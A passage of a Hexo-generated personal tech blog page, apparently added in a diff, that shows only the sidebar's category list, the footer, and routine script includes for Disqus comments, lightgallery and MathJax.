href="/categories/Frontend/React-Query/">React Query</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Frontend/Redux/">Redux</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Frontend/To-do-List/">To do List</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Frontend/ToastUI/">ToastUI</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Frontend/Vite/">Vite</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Frontend/Vue/">Vue</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Frontend/Vue/Tailwind/">Tailwind</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Frontend/Vue3/">Vue3</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Frontend/%EB%A1%9C%EA%B7%B8%EC%9D%B8/">로그인</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Frontend/%EB%B8%94%EB%A1%9C%EA%B7%B8/">블로그</a><span class="category-list-count">15</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Infra/">Infra</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Kubernetes/">Kubernetes</a><span class="category-list-count">49</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Kubernetes/Autoscaler/">Autoscaler</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Kubernetes/Config/">Config</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Kubernetes/Custom/">Custom</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Kubernetes/Helm/">Helm</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Kubernetes/Istio/">Istio</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Kubernetes/%EA%B5%AC%EC%84%B1%EC%9A%94%EC%86%8C/">구성요소</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Kubernetes/%EC%84%9C%EB%B9%84%EC%8A%A4/">서비스</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Kubernetes/%EC%9B%8C%ED%81%AC%EB%A1%9C%EB%93%9C/">워크로드</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Kubernetes/%EC%9D%B8%EC%A6%9D-%EC%9D%B8%EA%B0%80/">인증/인가</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Security/">Security</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/">Spring</a><span class="category-list-count">279</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-AOP/">Spring AOP</a><span class="category-list-count">30</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-AOP/AOP-Aspect/">AOP Aspect</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-AOP/AspectJ/">AspectJ</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-AOP/Bean-Post-Processor/">Bean Post Processor</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-AOP/Spring-Proxy/">Spring Proxy</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-AOP/%ED%8F%AC%EC%9D%B8%ED%8A%B8%EC%BB%B7/">포인트컷</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-AOP/%ED%8F%AC%EC%9D%B8%ED%8A%B8%EC%BB%B7-%ED%91%9C%ED%98%84%EC%8B%9D/">포인트컷 표현식</a><span class="category-list-count">9</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Batch/">Spring Batch</a><span class="category-list-count">36</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Batch/Job/">Job</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Batch/Step/">Step</a><span class="category-list-count">15</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Batch/Step/Chunk/">Chunk</a><span class="category-list-count">7</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Boot/">Spring Boot</a><span class="category-list-count">26</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Boot/File/">File</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Boot/Kafka/">Kafka</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Boot/Redis/">Redis</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Boot/Spring-Framework/">Spring Framework</a><span class="category-list-count">7</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Cloud/">Spring Cloud</a><span class="category-list-count">34</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Cloud/Config/">Config</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Cloud/Feign-Client/">Feign Client</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Cloud/Gateway/">Gateway</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Cloud/Kafka/">Kafka</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Cloud/Service-Discovery/">Service Discovery</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Core/">Spring Core</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-DB/">Spring DB</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Data-JPA/">Spring Data JPA</a><span class="category-list-count">12</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Framework/">Spring Framework</a><span class="category-list-count">11</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Framework/lifecycle/">lifecycle</a><span class="category-list-count">7</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-MVC/">Spring MVC</a><span class="category-list-count">15</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Rest/">Spring Rest</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Security/">Spring Security</a><span class="category-list-count">29</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Security/Filter/">Filter</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Security/Form-login/">Form login</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Security/JWT/">JWT</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Security/Oauth2/">Oauth2</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Security/Security/">Security</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Security/Security/Config/">Config</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Security/%EC%9D%B8%EC%A6%9D-%EA%B3%BC%EC%A0%95/">인증 과정</a><span class="category-list-count">5</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-Test/">Spring Test</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-WebSocket/">Spring WebSocket</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-%EA%B3%A0%EA%B8%89%ED%8E%B8/">Spring 고급편</a><span class="category-list-count">25</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-%EA%B3%A0%EA%B8%89%ED%8E%B8/CGLIB/">CGLIB</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-%EA%B3%A0%EA%B8%89%ED%8E%B8/Decorator-%ED%8C%A8%ED%84%B4/">Decorator 패턴</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-%EA%B3%A0%EA%B8%89%ED%8E%B8/Dynamic-Proxy/">Dynamic Proxy</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-%EA%B3%A0%EA%B8%89%ED%8E%B8/Proxy-%ED%8C%A8%ED%84%B4/">Proxy 패턴</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-%EA%B3%A0%EA%B8%89%ED%8E%B8/Strategy-%ED%8C%A8%ED%84%B4/">Strategy 패턴</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-%EA%B3%A0%EA%B8%89%ED%8E%B8/Template-Callback-%ED%8C%A8%ED%84%B4/">Template Callback 패턴</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-%EA%B3%A0%EA%B8%89%ED%8E%B8/Template-Method-%ED%8C%A8%ED%84%B4/">Template Method 패턴</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/Spring-%EA%B3%A0%EA%B8%89%ED%8E%B8/ThreadLocal/">ThreadLocal</a><span class="category-list-count">6</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/%EA%B0%95%EC%9D%98/">강의</a><span class="category-list-count">19</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/%EA%B0%95%EC%9D%98/%EB%A0%88%EC%8A%A4%ED%86%A0%EB%9E%91-%EC%98%88%EC%95%BD-%EC%82%AC%EC%9D%B4%ED%8A%B8/">레스토랑 예약 사이트</a><span class="category-list-count">19</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Spring/%EA%B2%8C%EC%8B%9C%ED%8C%90-%EB%A7%8C%EB%93%A4%EA%B8%B0/">게시판 만들기</a><span class="category-list-count">22</span></li></ul></li></ul>
+        </div>
+    </div>
+
+
+            
+        
+    </div>
+</aside>
+
+                </div>
+            </div>
+        </div>
+        <footer id="footer">
+    <div class="container">
+        <div class="container-inner">
+            <a id="back-to-top" href="javascript:;"><i class="icon fa fa-angle-up"></i></a>
+            <div class="credit">
+                <h1 class="logo-wrap">
+                    <a href="/" class="logo"></a>
+                </h1>
+                <p>&copy; 2025 ckck803</p>
+                
+                <p>Powered by <a href="https://hexo.io/" target="_blank" rel="external nofollow noopener noreferrer">Hexo</a>. Theme by <a href="https://github.com/ppoffice" target="_blank" rel="external nofollow noopener noreferrer">PPOffice</a></p>
+                
+            </div>
+            <div class="footer-plugins">
+              
+    
+
+
+            </div>
+        </div>
+    </div>
+</footer>
+
+    </div>
+    
+    
+    <script>
+    var disqus_shortname = 'hexo-theme-hueman';
+    
+    
+    var disqus_url = 'https://ckck803.github.io/2025/12/04/security/xss/';
+    
+    (function() {
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+
+
+
+
+
+    
+        
+<script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-share.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-video.min.js"></script>
+
+    
+    
+        
+<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+    
+    
+
+    
+    
+    
+
+
+
+<!-- Custom Scripts -->
+
+<script src="/js/main.js"></script>
+
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+</html>
